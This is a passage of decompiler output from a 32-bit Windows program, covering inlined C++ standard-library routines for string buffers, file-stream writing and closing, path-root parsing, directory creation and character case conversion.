  if ( (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 12))(this, -1) == -1 )
    return 0;
  v18 = 0;
  v19 = 15;
  LOBYTE(Buffer[0]) = 0;
  sub_4092B0(Buffer, 8u, 0);
  v20 = 0;
LABEL_6:
  v3 = (void **)Buffer[0];
  v4 = v19;
  while ( 1 )
  {
    v5 = Buffer;
    v6 = Buffer;
    if ( v4 >= 0x10 )
    {
      v6 = v3;
      v5 = v3;
    }
    v7 = (*(int (__thiscall **)(_DWORD, int, void **, int, void ***))(**((_DWORD **)this + 14) + 32))(
           *((_DWORD *)this + 14),
           (int)this + 64,
           v6,
           (int)v5 + v18,
           &v16);
    if ( !v7 )
    {
      *((_BYTE *)this + 61) = 0;
      goto LABEL_14;
    }
    v8 = v7 - 1;
    if ( v8 )
      break;
LABEL_14:
    v4 = v19;
    v11 = Buffer;
    v3 = (void **)Buffer[0];
    if ( v19 >= 0x10 )
      v11 = (void **)Buffer[0];
    v12 = (char *)v16 - (char *)v11;
    if ( v16 != v11 )
    {
      v13 = Buffer;
      if ( v19 >= 0x10 )
        v13 = (void **)Buffer[0];
      v14 = fwrite(v13, 1u, v12, *((FILE **)this + 19));
      v4 = v19;
      v9 = v12 == v14;
      v3 = (void **)Buffer[0];
      if ( !v9 )
        goto LABEL_12;
    }
    if ( !*((_BYTE *)this + 61) )
      goto LABEL_23;
    if ( !v12 )
    {
      sub_409100(Buffer, 8u, 0);
      goto LABEL_6;
    }
  }
  v4 = v19;
  v9 = v8 == 2;
  v3 = (void **)Buffer[0];
  if ( !v9 )
  {
LABEL_12:
    v10 = 0;
    goto LABEL_24;
  }
LABEL_23:
  v10 = 1;
LABEL_24:
  if ( v4 >= 0x10 )
  {
    v15 = v3;
    if ( v4 + 1 >= 0x1000 )
    {
      v3 = (void **)*(v3 - 1);
      if ( (unsigned int)((char *)v15 - (char *)v3 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_40FBF3(v3);
  }
  return v10;
}

//----- (004088D0) --------------------------------------------------------
void __thiscall sub_4088D0(int **this)
{
  int *v2; // esi
  unsigned int v3; // eax
  unsigned int v4; // edi
  unsigned int v5; // ecx
  void **v6; // esi
  int v7; // ecx
  int v8; // edx
  int v9; // eax
  int v10; // eax
  unsigned int v11; // edx
  int v12; // eax
  int v13; // edi
  int v14; // ecx
  int v15; // ecx
  unsigned int v16; // edx
  int v17; // eax
  unsigned int v18; // edi
  int v19; // eax
  int v20; // ecx
  int v21; // ecx
  bool v22; // zf
  int v23; // ecx
  void **v24; // esi
  void *v25; // ecx
  void *v26; // ecx
  int v27; // edi
  int **v28; // esi
  unsigned int v29; // ecx
  int *v30; // eax
  void *v31; // ecx
  void *v32; // ecx
  void *v33[5]; // [esp+Ch] [ebp-50h] BYREF
  unsigned int v34; // [esp+20h] [ebp-3Ch]
  int **v35; // [esp+24h] [ebp-38h]
  int v36; // [esp+28h] [ebp-34h]
  int v37; // [esp+2Ch] [ebp-30h]
  int v38; // [esp+30h] [ebp-2Ch]
  void *Block[4]; // [esp+34h] [ebp-28h] BYREF
  __int64 v40; // [esp+44h] [ebp-18h]
  int v41; // [esp+58h] [ebp-4h]

  v35 = this;
  v40 = 0x700000000i64;
  LOWORD(Block[0]) = 0;
  v2 = *this;
  v41 = 0;
  v3 = sub_408F40(v2);
  v4 = (unsigned int)this[7];
  v5 = v2[4];
  v36 = v4;
  if ( v5 <= v4 )
    goto LABEL_54;
  if ( v4 < v3 )
  {
    v6 = sub_40C350(v2, v33, 0, v3);
    if ( Block != v6 )
    {
      sub_4075D0(Block);
      *(_OWORD *)Block = *(_OWORD *)v6;
      v40 = *((_QWORD *)v6 + 2);
      v6[4] = 0;
      v6[5] = (void *)7;
      *(_WORD *)v6 = 0;
    }
    sub_4075D0(v33);
    goto LABEL_54;
  }
  if ( v4 == v3 && v3 < v5 )
  {
    v7 = (int)v2;
    if ( (unsigned int)v2[5] >= 8 )
      v7 = *v2;
    v8 = 2 * v3;
    if ( *(_WORD *)(v7 + 2 * v3) == 47 )
      goto LABEL_14;
    v9 = (int)v2;
    if ( (unsigned int)v2[5] >= 8 )
      v9 = *v2;
    if ( *(_WORD *)(v9 + v8) == 92 )
    {
LABEL_14:
      Block[0] = (void *)92;
LABEL_53:
      LODWORD(v40) = 1;
      goto LABEL_54;
    }
    v5 = v2[4];
  }
  v10 = 0;
  v37 = 0;
  v38 = 0;
  if ( v4 < v5 )
  {
    v11 = v4;
    v12 = 2 * v4;
    v13 = 0;
    while ( 1 )
    {
      v14 = (int)v2;
      if ( (unsigned int)v2[5] >= 8 )
        v14 = *v2;
      if ( *(_WORD *)(v12 + v14) != 47 )
      {
        v15 = (int)v2;
        if ( (unsigned int)v2[5] >= 8 )
          v15 = *v2;
        if ( *(_WORD *)(v12 + v15) != 92 )
          break;
      }
      v5 = v2[4];
      ++v13;
      ++v11;
      v37 = v13;
      v12 += 2;
      if ( v11 >= v5 )
        goto LABEL_27;
    }
    v5 = v2[4];
LABEL_27:
    v4 = v36;
    v10 = v37;
  }
  v16 = v4 + v10;
  v36 = v4 + v10;
  if ( v4 + v10 >= v5 )
  {
LABEL_51:
    if ( !v10 )
      goto LABEL_54;
    Block[0] = (void *)46;
    goto LABEL_53;
  }
  v17 = v4 + v37;
  v18 = v2[4];
  v19 = 2 * v17;
  while ( 1 )
  {
    v20 = (int)v2;
    if ( (unsigned int)v2[5] >= 8 )
      v20 = *v2;
    if ( *(_WORD *)(v19 + v20) == 47 )
      break;
    v21 = (int)v2;
    if ( (unsigned int)v2[5] >= 8 )
      v21 = *v2;
    v22 = *(_WORD *)(v19 + v21) == 92;
    v23 = v38;
    if ( !v22 )
    {
      v23 = v38 + 1;
      ++v16;
      v19 += 2;
      ++v38;
      if ( v16 < v18 )
        continue;
    }
    goto LABEL_39;
  }
  v23 = v38;
LABEL_39:
  if ( !v23 )
  {
    v10 = v37;
    goto LABEL_51;
  }
  v24 = sub_40C350(v2, v33, v36, v23);
  if ( Block != v24 )
  {
    if ( HIDWORD(v40) >= 8 )
    {
      v25 = Block[0];
      if ( (unsigned int)(2 * HIDWORD(v40) + 2) >= 0x1000 )
      {
        v25 = (void *)*((_DWORD *)Block[0] - 1);
        if ( (unsigned int)(Block[0] - v25 - 4) > 0x1F )
          goto LABEL_70;
      }
      sub_40FBF3(v25);
    }
    v40 = 0x700000000i64;
    LOWORD(Block[0]) = 0;
    *(_OWORD *)Block = *(_OWORD *)v24;
    v40 = *((_QWORD *)v24 + 2);
    v24[4] = 0;
    v24[5] = (void *)7;
    *(_WORD *)v24 = 0;
  }
  if ( v34 >= 8 )
  {
    v26 = v33[0];
    if ( 2 * v34 + 2 >= 0x1000 )
    {
      v26 = (void *)*((_DWORD *)v33[0] - 1);
      if ( (unsigned int)(v33[0] - v26 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_40FBF3(v26);
  }
LABEL_54:
  v27 = sub_405C90((int)v33, (char *)Block);
  v28 = v35 + 1;
  if ( v35 + 1 == (int **)v27 )
    goto LABEL_61;
  v29 = (unsigned int)v35[6];
  if ( v29 >= 8 )
  {
    v30 = *v28;
    if ( 2 * v29 + 2 < 0x1000 )
    {
LABEL_59:
      sub_40FBF3(v30);
      goto LABEL_60;
    }
    if ( (unsigned int)v30 - *(v30 - 1) - 4 <= 0x1F )
    {
      v30 = (int *)*(v30 - 1);
      goto LABEL_59;
    }
LABEL_70:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_60:
  v28[4] = 0;
  v28[5] = (int *)7;
  *(_WORD *)v28 = 0;
  *(_OWORD *)v28 = *(_OWORD *)v27;
  *((_QWORD *)v28 + 2) = *(_QWORD *)(v27 + 16);
  *(_DWORD *)(v27 + 16) = 0;
  *(_DWORD *)(v27 + 20) = 7;
  *(_WORD *)v27 = 0;
LABEL_61:
  if ( v34 >= 8 )
  {
    v31 = v33[0];
    if ( 2 * v34 + 2 >= 0x1000 )
    {
      v31 = (void *)*((_DWORD *)v33[0] - 1);
      if ( (unsigned int)(v33[0] - v31 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_40FBF3(v31);
  }
  if ( HIDWORD(v40) >= 8 )
  {
    v32 = Block[0];
    if ( (unsigned int)(2 * HIDWORD(v40) + 2) >= 0x1000 )
    {
      v32 = (void *)*((_DWORD *)Block[0] - 1);
      if ( (unsigned int)(Block[0] - v32 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_40FBF3(v32);
  }
}

//----- (00408C60) --------------------------------------------------------
void __thiscall sub_408C60(volatile signed __int32 *this)
{
  _InterlockedIncrement(this + 1);
}

//----- (00408C70) --------------------------------------------------------
int __thiscall sub_408C70(int this, FILE *Stream, int a3)
{
  _DWORD *v4; // ecx
  char **v5; // eax
  char **v6; // eax
  int *v7; // eax
  int result; // eax
  int *Count; // [esp+8h] [ebp-10h] BYREF
  char **Pointer; // [esp+Ch] [ebp-Ch] BYREF
  char **Base; // [esp+10h] [ebp-8h] BYREF

  v4 = (_DWORD *)(this + 8);
  *(_BYTE *)(this + 72) = a3 == 1;
  *(_DWORD *)(this + 12) = this + 4;
  *(_DWORD *)(this + 28) = this + 20;
  *(_DWORD *)(this + 32) = this + 24;
  *(_DWORD *)(this + 44) = this + 36;
  *(_DWORD *)(this + 48) = this + 40;
  *(_BYTE *)(this + 61) = 0;
  *(_DWORD *)(this + 16) = v4;
  *v4 = 0;
  **(_DWORD **)(this + 32) = 0;
  **(_DWORD **)(this + 48) = 0;
  **(_DWORD **)(this + 12) = 0;
  **(_DWORD **)(this + 28) = 0;
  **(_DWORD **)(this + 44) = 0;
  if ( Stream )
  {
    Base = 0;
    Pointer = 0;
    Count = 0;
    _get_stream_buffer_pointers(Stream, &Base, &Pointer, &Count);
    v5 = Base;
    *(_DWORD *)(this + 12) = Base;
    *(_DWORD *)(this + 16) = v5;
    v6 = Pointer;
    *(_DWORD *)(this + 28) = Pointer;
    *(_DWORD *)(this + 32) = v6;
    v7 = Count;
    *(_DWORD *)(this + 44) = Count;
    *(_DWORD *)(this + 48) = v7;
  }
  *(_DWORD *)(this + 76) = Stream;
  *(_DWORD *)(this + 64) = dword_509588;
  result = dword_50958C;
  *(_DWORD *)(this + 68) = dword_50958C;
  *(_DWORD *)(this + 56) = 0;
  return result;
}
// 509588: using guessed type int dword_509588;
// 50958C: using guessed type int dword_50958C;

//----- (00408D70) --------------------------------------------------------
_DWORD *__thiscall sub_408D70(_DWORD *this)
{
  _DWORD *result; // eax

  this[3] = this + 1;
  this[4] = this + 2;
  this[7] = this + 5;
  this[8] = this + 6;
  this[11] = this + 9;
  this[12] = this + 10;
  this[2] = 0;
  *(_DWORD *)this[8] = 0;
  *(_DWORD *)this[12] = 0;
  *(_DWORD *)this[3] = 0;
  *(_DWORD *)this[7] = 0;
  result = (_DWORD *)this[11];
  *result = 0;
  return result;
}

//----- (00408DD0) --------------------------------------------------------
void __thiscall sub_408DD0(FILE **this)
{
  if ( this[19] )
    _lock_file(this[19]);
}

//----- (00408DF0) --------------------------------------------------------
int __cdecl sub_408DF0(int a1, int a2, int a3, __int128 a4, __int64 a5)
{
  __int128 *v5; // esi
  _BYTE *v6; // esi
  void **v7; // edx
  int v8; // esi
  __int128 *v9; // eax
  char *v10; // esi
  void *v11; // ecx
  __int128 v12; // xmm0
  int result; // eax
  void *Src[4]; // [esp+Ch] [ebp-28h] BYREF
  size_t Size; // [esp+1Ch] [ebp-18h]
  unsigned int v16; // [esp+20h] [ebp-14h]
  int v17; // [esp+24h] [ebp-10h]
  int v18; // [esp+30h] [ebp-4h]

  v18 = 0;
  if ( (_DWORD)a5 )
  {
    if ( (unsigned int)(HIDWORD(a5) - a5) < 2 )
    {
      LOBYTE(v17) = 0;
      sub_4063C0((void **)&a4, 2u, v17, &unk_42E51C, 2u);
    }
    else
    {
      v5 = &a4;
      if ( HIDWORD(a5) >= 0x10 )
        v5 = (__int128 *)a4;
      v6 = (char *)v5 + a5;
      LODWORD(a5) = a5 + 2;
      memmove(v6, &unk_42E51C, 2u);
      v6[2] = 0;
    }
  }
  (*(void (__thiscall **)(int, void **, int))(*(_DWORD *)a3 + 8))(a3, Src, a2);
  v7 = Src;
  if ( v16 >= 0x10 )
    v7 = (void **)Src[0];
  v8 = a5;
  LOBYTE(v18) = 1;
  v17 = Size;
  if ( Size > HIDWORD(a5) - (int)a5 )
  {
    LOBYTE(v17) = 0;
    sub_4063C0((void **)&a4, Size, v17, v7, Size);
  }
  else
  {
    LODWORD(a5) = a5 + Size;
    v9 = &a4;
    if ( HIDWORD(a5) >= 0x10 )
      v9 = (__int128 *)a4;
    v10 = (char *)v9 + v8;
    memmove(v10, v7, Size);
    v10[v17] = 0;
  }
  if ( v16 >= 0x10 )
  {
    v11 = Src[0];
    if ( v16 + 1 >= 0x1000 )
    {
      v11 = (void *)*((_DWORD *)Src[0] - 1);
      if ( (unsigned int)(Src[0] - v11 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_40FBF3(v11);
  }
  v12 = a4;
  *(_DWORD *)(a1 + 16) = 0;
  result = a1;
  *(_DWORD *)(a1 + 20) = 0;
  *(_OWORD *)a1 = v12;
  *(_QWORD *)(a1 + 16) = a5;
  return result;
}

//----- (00408F40) --------------------------------------------------------
unsigned int __fastcall sub_408F40(int *a1)
{
  unsigned int v1; // esi
  unsigned int v2; // edx
  _WORD *v3; // eax
  _WORD *v4; // eax
  int *v5; // eax
  int *v6; // eax
  int *v7; // eax
  int *v8; // eax
  unsigned int result; // eax
  int *v10; // edi
  int *v11; // edi
  char *i; // edx
  int v13; // edx

  v1 = a1[4];
  if ( v1 <= 2 )
    goto LABEL_29;
  v2 = a1[5];
  v3 = a1;
  if ( v2 >= 8 )
    v3 = (_WORD *)*a1;
  if ( *v3 != 47 )
  {
    v4 = a1;
    if ( v2 >= 8 )
      v4 = (_WORD *)*a1;
    if ( *v4 != 92 )
      goto LABEL_29;
  }
  v5 = a1;
  if ( v2 >= 8 )
    v5 = (int *)*a1;
  if ( *((_WORD *)v5 + 1) != 47 )
  {
    v6 = a1;
    if ( v2 >= 8 )
      v6 = (int *)*a1;
    if ( *((_WORD *)v6 + 1) != 92 )
      goto LABEL_29;
  }
  v7 = a1;
  if ( v2 >= 8 )
    v7 = (int *)*a1;
  if ( *((_WORD *)v7 + 2) == 47 )
    goto LABEL_29;
  v8 = a1;
  if ( v2 >= 8 )
    v8 = (int *)*a1;
  if ( *((_WORD *)v8 + 2) != 92 )
  {
    for ( result = 3; result < v1; ++result )
    {
      v10 = a1;
      if ( v2 >= 8 )
        v10 = (int *)*a1;
      if ( *((_WORD *)v10 + result) == 47 )
        break;
      v11 = a1;
      if ( v2 >= 8 )
        v11 = (int *)*a1;
      if ( *((_WORD *)v11 + result) == 92 )
        break;
    }
  }
  else
  {
LABEL_29:
    if ( (unsigned int)a1[5] >= 8 )
      a1 = (int *)*a1;
    if ( !v1 )
      return 0;
    for ( i = (char *)a1; *(_WORD *)i != 58; i += 2 )
    {
      if ( !--v1 )
        return 0;
    }
    if ( i )
    {
      result = 0;
      v13 = (i - (char *)a1) >> 1;
      if ( v13 != -1 )
        return v13 + 1;
    }
    else
    {
      return 0;
    }
  }
  return result;
}

//----- (00409060) --------------------------------------------------------
void __thiscall sub_409060(FILE **this)
{
  if ( this[19] )
    _unlock_file(this[19]);
}

//----- (00409070) --------------------------------------------------------
void __noreturn sub_409070()
{
  sub_40E74D("string too long");
}
// 409070: using guessed type void __noreturn sub_409070();

//----- (00409080) --------------------------------------------------------
void __noreturn sub_409080()
{
  sub_40E76D("invalid string position");
}
// 409080: using guessed type void __noreturn sub_409080();

//----- (00409090) --------------------------------------------------------
void **__thiscall sub_409090(void **Src, _DWORD *Srca)
{
  _DWORD *v3; // ecx
  unsigned int v4; // ebx
  unsigned int v5; // esi
  char *v6; // edx
  void *v7; // eax
  char *v8; // esi

  v3 = Srca;
  if ( Srca[5] >= 0x10u )
    v3 = (_DWORD *)*Srca;
  v4 = Srca[4];
  v5 = (unsigned int)Src[5];
  v6 = (char *)Src[4];
  if ( v4 > v5 - (unsigned int)v6 )
  {
    LOBYTE(Srca) = 0;
    return sub_4063C0(Src, v4, (int)Srca, v3, v4);
  }
  else
  {
    Src[4] = &v6[v4];
    v7 = Src;
    if ( v5 >= 0x10 )
      v7 = *Src;
    v8 = &v6[(_DWORD)v7];
    memmove(&v6[(_DWORD)v7], v3, v4);
    v8[v4] = 0;
    return Src;
  }
}

//----- (00409100) --------------------------------------------------------
void **__thiscall sub_409100(void **Src, size_t Size, char a3)
{
  unsigned int v3; // ebx
  unsigned int v5; // edx
  char *v6; // ecx
  void *v7; // eax
  char *v8; // esi

  v3 = Size;
  v5 = (unsigned int)Src[5];
  v6 = (char *)Src[4];
  if ( Size > v5 - (unsigned int)v6 )
  {
    LOBYTE(Size) = 0;
    return sub_406520(Src, v3, Size, v3, a3);
  }
  else
  {
    Src[4] = &v6[Size];
    v7 = Src;
    if ( v5 >= 0x10 )
      v7 = *Src;
    v8 = &v6[(_DWORD)v7];
    memset(&v6[(_DWORD)v7], a3, Size);
    v8[Size] = 0;
    return Src;
  }
}

//----- (00409160) --------------------------------------------------------
void **__thiscall sub_409160(void **Src, void *Srca, size_t Size)
{
  unsigned int v3; // ebx
  unsigned int v5; // edx
  char *v6; // ecx
  void *v7; // eax
  char *v8; // esi
  size_t v10; // [esp-4h] [ebp-Ch]

  v3 = Size;
  v5 = (unsigned int)Src[5];
  v6 = (char *)Src[4];
  if ( Size > v5 - (unsigned int)v6 )
  {
    v10 = Size;
    LOBYTE(Size) = 0;
    return sub_4063C0(Src, v3, Size, Srca, v10);
  }
  else
  {
    Src[4] = &v6[Size];
    v7 = Src;
    if ( v5 >= 0x10 )
      v7 = *Src;
    v8 = &v6[(_DWORD)v7];
    memmove(&v6[(_DWORD)v7], Srca, Size);
    v8[Size] = 0;
    return Src;
  }
}

//----- (004091C0) --------------------------------------------------------
_DWORD *__thiscall sub_4091C0(_DWORD *Src, unsigned int a2, unsigned __int16 a3)
{
  unsigned int v4; // ecx
  unsigned int v5; // edi
  int v6; // edx
  int v7; // eax
  _DWORD *v8; // ebx
  char *v9; // edi
  char v10; // cf
  unsigned int v11; // ecx
  unsigned __int16 *v12; // edi
  int i; // ecx
  int v15; // [esp+10h] [ebp+8h]

  v4 = a2;
  v5 = Src[5];
  v6 = Src[4];
  if ( a2 > v5 - v6 )
  {
    LOBYTE(a2) = 0;
    return sub_406680(Src, v4, a2, v4, a3);
  }
  else
  {
    v7 = v6 + a2;
    v15 = v6 + a2;
    Src[4] = v6 + v4;
    v8 = Src;
    if ( v5 >= 8 )
      v8 = (_DWORD *)*Src;
    v9 = (char *)v8 + 2 * v6;
    if ( v4 )
    {
      v10 = v4 & 1;
      v11 = v4 >> 1;
      memset32(v9, (a3 << 16) | a3, v11);
      v12 = (unsigned __int16 *)&v9[4 * v11];
      for ( i = v10; i; --i )
        *v12++ = a3;
      v7 = v15;
    }
    *((_WORD *)v8 + v7) = 0;
    return Src;
  }
}

//----- (00409240) --------------------------------------------------------
void **__thiscall sub_409240(void **Src, void *Srca, unsigned int a3)
{
  unsigned int v4; // ecx
  void *v5; // edx
  bool v6; // cf
  _DWORD *v7; // edi
  int v9; // [esp-4h] [ebp-8h]
  int v10; // [esp+10h] [ebp+Ch]

  v4 = a3;
  v5 = Src[4];
  if ( a3 > (_BYTE *)Src[5] - (_BYTE *)v5 )
  {
    v9 = a3;
    LOBYTE(a3) = 0;
    return sub_4060C0(Src, v4, a3, Srca, v9);
  }
  else
  {
    v6 = (unsigned int)Src[5] < 8;
    v10 = (int)v5 + a3;
    v7 = Src;
    Src[4] = (char *)v5 + v4;
    if ( !v6 )
      v7 = *Src;
    memmove((char *)v7 + 2 * (_DWORD)v5, Srca, 2 * v4);
    *((_WORD *)v7 + v10) = 0;
    return Src;
  }
}

//----- (004092B0) --------------------------------------------------------
void **__thiscall sub_4092B0(void **this, size_t Size, char a3)
{
  unsigned int v4; // ecx
  void *v5; // edi
  size_t v7; // edi
  unsigned int v8; // edx
  unsigned int v9; // ecx
  size_t v10; // eax
  void *v11; // eax
  _DWORD *v12; // ecx
  void *v13; // eax
  unsigned int v14; // [esp+Ch] [ebp-Ch]
  _DWORD *v15; // [esp+10h] [ebp-8h]

  v4 = (unsigned int)this[5];
  v14 = v4;
  if ( Size > v4 )
  {
    if ( Size > 0x7FFFFFFF )
      sub_409070();
    v7 = Size | 0xF;
    if ( (Size | 0xF) <= 0x7FFFFFFF )
    {
      v8 = v4 >> 1;
      if ( v4 <= 0x7FFFFFFF - (v4 >> 1) )
      {
        if ( v7 < v8 + v4 )
          v7 = v8 + v4;
      }
      else
      {
        v7 = 0x7FFFFFFF;
      }
    }
    else
    {
      v7 = 0x7FFFFFFF;
    }
    v9 = __CFADD__(v7, 1) ? -1 : v7 + 1;
    if ( v9 < 0x1000 )
    {
      if ( v9 )
        v12 = operator new(__CFADD__(v7, 1) ? -1 : v7 + 1);
      else
        v12 = 0;
    }
    else
    {
      v10 = v9 + 35;
      if ( v9 + 35 <= v9 )
        v10 = -1;
      v11 = operator new(v10);
      if ( !v11 )
        goto LABEL_27;
      v12 = (_DWORD *)(((unsigned int)v11 + 35) & 0xFFFFFFE0);
      *(v12 - 1) = v11;
    }
    v15 = v12;
    this[4] = (void *)Size;
    this[5] = (void *)v7;
    memset(v12, a3, Size);
    *((_BYTE *)v15 + Size) = 0;
    if ( v14 < 0x10 )
    {
LABEL_25:
      *this = v15;
      return this;
    }
    v13 = *this;
    if ( v14 + 1 < 0x1000 )
    {
LABEL_24:
      sub_40FBF3(v13);
      goto LABEL_25;
    }
    if ( (unsigned int)v13 - *((_DWORD *)v13 - 1) - 4 <= 0x1F )
    {
      v13 = (void *)*((_DWORD *)v13 - 1);
      goto LABEL_24;
    }
LABEL_27:
    _invalid_parameter_noinfo_noreturn();
  }
  v5 = this;
  if ( v4 >= 0x10 )
    v5 = *this;
  this[4] = (void *)Size;
  memset(v5, a3, Size);
  *((_BYTE *)v5 + Size) = 0;
  return this;
}
// 409070: using guessed type void __noreturn sub_409070(void);

//----- (004093F0) --------------------------------------------------------
void **__thiscall sub_4093F0(void **this, void *Src, size_t Size)
{
  unsigned int v4; // ecx
  void *v5; // ebx
  size_t v7; // ebx
  unsigned int v8; // edx
  unsigned int v9; // ecx
  size_t v10; // eax
  void *v11; // eax
  void *v12; // ecx
  _DWORD *v13; // eax
  void *v14; // eax
  unsigned int v15; // [esp+Ch] [ebp-Ch]
  _DWORD *v16; // [esp+14h] [ebp-4h]

  v4 = (unsigned int)this[5];
  v15 = v4;
  if ( Size > v4 )
  {
    if ( Size > 0x7FFFFFFF )
      sub_409070();
    v7 = Size | 0xF;
    if ( (Size | 0xF) <= 0x7FFFFFFF )
    {
      v8 = v4 >> 1;
      if ( v4 <= 0x7FFFFFFF - (v4 >> 1) )
      {
        if ( v7 < v8 + v4 )
          v7 = v8 + v4;
      }
      else
      {
        v7 = 0x7FFFFFFF;
      }
    }
    else
    {
      v7 = 0x7FFFFFFF;
    }
    v9 = __CFADD__(v7, 1) ? -1 : v7 + 1;
    if ( v9 < 0x1000 )
    {
      if ( v9 )
        v13 = operator new(__CFADD__(v7, 1) ? -1 : v7 + 1);
      else
        v13 = 0;
    }
    else
    {
      v10 = v9 + 35;
      if ( v9 + 35 <= v9 )
        v10 = -1;
      v11 = operator new(v10);
      v12 = v11;
      if ( !v11 )
        goto LABEL_27;
      v13 = (_DWORD *)(((unsigned int)v11 + 35) & 0xFFFFFFE0);
      *(v13 - 1) = v12;
    }
    v16 = v13;
    this[4] = (void *)Size;
    this[5] = (void *)v7;
    memmove_0(v13, Src, Size);
    *((_BYTE *)v16 + Size) = 0;
    if ( v15 < 0x10 )
    {
LABEL_25:
      *this = v16;
      return this;
    }
    v14 = *this;
    if ( v15 + 1 < 0x1000 )
    {
LABEL_24:
      sub_40FBF3(v14);
      goto LABEL_25;
    }
    if ( (unsigned int)v14 - *((_DWORD *)v14 - 1) - 4 <= 0x1F )
    {
      v14 = (void *)*((_DWORD *)v14 - 1);
      goto LABEL_24;
    }
LABEL_27:
    _invalid_parameter_noinfo_noreturn();
  }
  v5 = this;
  if ( v4 >= 0x10 )
    v5 = *this;
  this[4] = (void *)Size;
  memmove(v5, Src, Size);
  *((_BYTE *)v5 + Size) = 0;
  return this;
}
// 409070: using guessed type void __noreturn sub_409070(void);

//----- (00409530) --------------------------------------------------------
int __thiscall sub_409530(_DWORD *this, char a2, char a3)
{
  int result; // eax
  int v4; // ecx
  int *v5; // [esp-4h] [ebp-20h]
  int *v6; // [esp-4h] [ebp-20h]
  int *v7; // [esp-4h] [ebp-20h]
  char pExceptionObject[20]; // [esp+0h] [ebp-1Ch] BYREF
  _DWORD v9[2]; // [esp+14h] [ebp-8h] BYREF

  result = a2 & 0x17;
  this[3] = result;
  v4 = result & this[4];
  if ( v4 )
  {
    if ( !a3 )
    {
      if ( (v4 & 4) != 0 )
      {
        v7 = sub_40B080(v9, 1);
        sub_407160(pExceptionObject, "ios_base::badbit set", v7);
      }
      else if ( (v4 & 2) != 0 )
      {
        v5 = sub_40B080(v9, 1);
        sub_407160(pExceptionObject, "ios_base::failbit set", v5);
      }
      else
      {
        v6 = sub_40B080(v9, 1);
        sub_407160(pExceptionObject, "ios_base::eofbit set", v6);
      }
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
    }
    _CxxThrowException(0, 0);
  }
  return result;
}
// 409530: using guessed type _DWORD var_8[2];

//----- (004095B0) --------------------------------------------------------
FILE **__thiscall sub_4095B0(FILE **this)
{
  FILE **v3; // edi

  if ( this[19] )
  {
    v3 = this;
    if ( !sub_408760(this) )
      v3 = 0;
    if ( fclose(this[19]) )
      v3 = 0;
    sub_408C70((int)this, 0, 2);
    return v3;
  }
  else
  {
    sub_408C70((int)this, 0, 2);
    return 0;
  }
}

//----- (00409600) --------------------------------------------------------
bool __cdecl sub_409600(LPCWSTR lpPathName, _DWORD *a2)
{
  const WCHAR *v2; // eax
  int dir; // edi
  bool v4; // zf
  bool v5; // sf

  v2 = lpPathName;
  if ( *((_DWORD *)lpPathName + 5) >= 8u )
    v2 = *(const WCHAR **)lpPathName;
  dir = _Make_dir(v2);
  if ( !std::_Execute_once(
          (struct std::once_flag *)&unk_5095AC,
          (int (__stdcall *)(void *, void *, void **))sub_405DB0,
          &unk_5095B0) )
    terminate();
  *a2 = 0;
  a2[1] = &unk_5095B0;
  v4 = dir == 0;
  v5 = dir < 0;
  if ( dir < 0 )
  {
    if ( !std::_Execute_once(
            (struct std::once_flag *)&unk_509594,
            (int (__stdcall *)(void *, void *, void **))sub_405D70,
            &unk_509598) )
      terminate();
    *a2 = 1;
    v4 = dir == 0;
    v5 = dir < 0;
    a2[1] = &unk_509598;
  }
  return !v5 && !v4;
}
// 41828B: using guessed type void __noreturn terminate(void);

//----- (00409770) --------------------------------------------------------
char sub_409770()
{
  return 1;
}

//----- (00409780) --------------------------------------------------------
int sub_409780()
{
  return 1;
}

//----- (00409790) --------------------------------------------------------
int __stdcall sub_409790(int a1, int a2, int a3, _DWORD *a4, int a5, int a6, _DWORD *a7)
{
  *a4 = a2;
  *a7 = a5;
  return 3;
}

//----- (004097B0) --------------------------------------------------------
unsigned int __stdcall sub_4097B0(int a1, int a2, int a3, unsigned int a4)
{
  unsigned int result; // eax

  result = a3 - a2;
  if ( a4 < a3 - a2 )
    return a4;
  return result;
}

//----- (004097E0) --------------------------------------------------------
int __stdcall sub_4097E0(void *Src, int a2, int a3, void *a4)
{
  memmove_0(a4, Src, a2 - (_DWORD)Src);
  return a2;
}

//----- (00409800) --------------------------------------------------------
int __thiscall sub_409800(int this, unsigned __int8 a2)
{
  return _Tolower(a2, (const _Ctypevec *)(this + 8));
}

//----- (00409820) --------------------------------------------------------
_BYTE *__thiscall sub_409820(char *this, _BYTE *a2, unsigned int a3)
{
  _BYTE *v3; // esi
  unsigned int v4; // ebx
  int v5; // edi
  const _Ctypevec *v6; // eax
  const _Ctypevec *v8; // [esp+18h] [ebp+Ch]

  v3 = a2;
  v4 = a3 - (_DWORD)a2;
  v5 = 0;
  if ( (unsigned int)a2 > a3 )
    v4 = 0;
  if ( v4 )
  {
    v6 = (const _Ctypevec *)(this + 8);
    v8 = (const _Ctypevec *)(this + 8);
    do
    {
      *v3 = _Tolower((unsigned __int8)*v3, v6);
      ++v5;
      v6 = v8;
      ++v3;
    }
    while ( v5 != v4 );
  }
  return v3;
}

//----- (00409870) --------------------------------------------------------
int __thiscall sub_409870(int this, unsigned __int8 a2)
{
  return _Toupper(a2, (const _Ctypevec *)(this + 8));
}

//----- (00409890) --------------------------------------------------------
_BYTE *__thiscall sub_409890(char *this, _BYTE *a2, unsigned int a3)
{
  _BYTE *v3; // esi
  unsigned int v4; // ebx
  int v5; // edi
  const _Ctypevec *v6; // eax
  const _Ctypevec *v8; // [esp+18h] [ebp+Ch]

  v3 = a2;
  v4 = a3 - (_DWORD)a2;
  v5 = 0;
  if ( (unsigned int)a2 > a3 )
    v4 = 0;
  if ( v4 )
  {
    v6 = (const _Ctypevec *)(this + 8);
    v8 = (const _Ctypevec *)(this + 8);
    do
    {
      *v3 = _Toupper((unsigned __int8)*v3, v6);
      ++v5;
      v6 = v8;
      ++v3;
    }
    while ( v5 != v4 );
  }
  return v3;
}

//----- (00409910) --------------------------------------------------------
int __stdcall sub_409910(void *Src, int a2, void *a3)
{
  memmove_0(a3, Src, a2 - (_DWORD)Src);
  return a2;
}

//----- (00409930) --------------------------------------------------------
